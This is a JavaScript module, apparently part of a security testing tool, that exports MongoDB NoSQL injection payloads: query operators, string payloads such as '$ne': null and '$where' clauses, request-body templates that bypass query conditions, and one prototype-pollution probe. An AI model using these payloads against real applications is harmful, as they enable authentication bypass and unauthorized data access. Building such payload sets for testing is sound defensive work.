// Common MongoDB NoSQL injection payloads and operators
// These are safe-by-default string payloads to be used in query parameters or JSON bodies

const operators = [
  '$ne', '$gt', '$lt', '$gte', '$lte', '$in', '$nin', '$regex', '$exists', '$type', '$or', '$and', '$not'
];

const stringPayloads = [
  // Basic boolean/context breakers
  "' || 1==1 || '",
  '" || 1==1 || "',
  "' && this==this && '",
  '" && this==this && "',

  // Mongo style JSON operators
  '{"$ne": null}',
  '{"$gt": ""}',
  '{"$regex": ".*"}',
  '{"$in": [""]}',

  // Array index trick
  '{"$where": "return true"}',

  // Prototype pollution attempts (detection only, not exploitation)
  '{"__proto__":{"polluted":"yes"}}'
];

const bodyTemplates = [
  // insert operator value in a field placeholder
  (field, val) => ({ [field]: { $ne: val } }),
  (field, val) => ({ [field]: { $regex: '.*' } }),
  (field, val) => ({ [field]: { $in: [val, ''] } }),
  (field, val) => ({ [field]: { $gt: '' } }),
  // top-level logical
  (field, val) => ({ $or: [ { [field]: val }, { [field]: { $ne: val } } ] }),
];

module.exports = {
  operators,
  stringPayloads,
  bodyTemplates,
};
